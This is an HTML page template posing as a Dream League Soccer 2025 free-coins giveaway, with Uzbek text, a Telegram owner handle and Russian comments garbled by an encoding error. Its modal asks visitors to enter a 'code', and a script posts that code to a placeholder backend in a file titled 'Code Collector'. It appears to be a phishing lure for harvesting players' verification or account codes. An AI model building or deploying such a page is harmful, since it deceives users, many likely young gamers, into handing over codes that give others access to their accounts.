
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DLS 2025 - –ö–æ–¥ –ö–æ–ª–ª–µ–∫—Ç–æ—Ä</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Orbitron', monospace;
      background: linear-gradient(135deg, #0f4c75, #3282b8, #bbe1fa);
      min-height: 100vh;
      overflow-x: hidden;
    }
    .container {
      text-align: center;
      padding: 2rem;
      color: white;
    }
    .btn {
      background: linear-gradient(135deg, #22c55e, #16a34a);
      border: 2px solid #fbbf24;
      color: white;
      font-weight: bold;
      font-size: 1.2rem;
      padding: 1rem 2rem;
      border-radius: 1rem;
      cursor: pointer;
      margin-top: 1.5rem;
      transition: transform 0.2s ease;
    }
    .btn:hover {
      transform: scale(1.05);
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background-color: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
    }
    .modal-content {
      background: #1e3a8a;
      padding: 2rem;
      border-radius: 1rem;
      max-width: 400px;
      width: 90%;
      text-align: center;
    }
    .modal input {
      padding: 0.8rem;
      width: 100%;
      margin: 1rem 0;
      border-radius: 0.5rem;
      border: none;
      font-size: 1rem;
    }
    .toast {
      position: fixed;
      top: 1rem;
      right: 1rem;
      background: #22c55e;
      color: white;
      padding: 1rem;
      border-radius: 0.5rem;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 style="font-size: 3rem;"><span style="color:#22c55e">DLS</span> <span style="color:#fbbf24">2025</span></h1>
    <p style="font-size:1.5rem;">DREAM LEAGUE SOCCER</p>
    <p style="color: #facc15;">üèÜ ULTIMATE FOOTBALL EXPERIENCE üèÜ</p>
    <button class="btn" onclick="openModal()">‚ö° DLS TANGA OLISH ‚ö°</button>
    <p style="margin-top:2rem; font-size: 0.9rem; opacity: 0.8;">Sayt va bot egasi: <b>xewop.t.me</b></p>
  </div>

  <div class="modal" id="modal">
    <div class="modal-content">
      <h2 style="color:#fbbf24;">Kodni kiriting:</h2>
      <input type="text" id="codeInput" placeholder="Masalan: FDJDH" />
      <button class="btn" onclick="submitCode()">Yuborish</button>
    </div>
  </div>

  <div class="toast" id="toast">‚úÖ Kod yuborildi!</div>

  <script>
    function openModal() {
      document.getElementById("modal").style.display = "flex";
    }

    function submitCode() {
      const code = document.getElementById("codeInput").value.trim();
      if (!code) return;

      document.getElementById("modal").style.display = "none";
      document.getElementById("codeInput").value = "";

      // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä (–∑–∞–º–µ–Ω–∏ URL –Ω–∞ —Å–≤–æ–π –ø–æ–∑–∂–µ)
      fetch("https://YOUR-BACKEND-URL/send-code", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ code })
      })
      .then(res => res.json())
      .then(data => {
        showToast(data.success ? "‚úÖ Kod yuborildi!" : "‚ùå Xatolik yuz berdi");
      })
      .catch(() => {
        showToast("‚ùå Serverga ulanishda xatolik");
      });
    }

    function showToast(message) {
      const toast = document.getElementById("toast");
      toast.textContent = message;
      toast.style.display = "block";
      setTimeout(() => {
        toast.style.display = "none";
      }, 3000);
    }

    window.onclick = function(event) {
      const modal = document.getElementById("modal");
      if (event.target === modal) {
        modal.style.display = "none";
      }
    }
  </script>
</body>
</html>
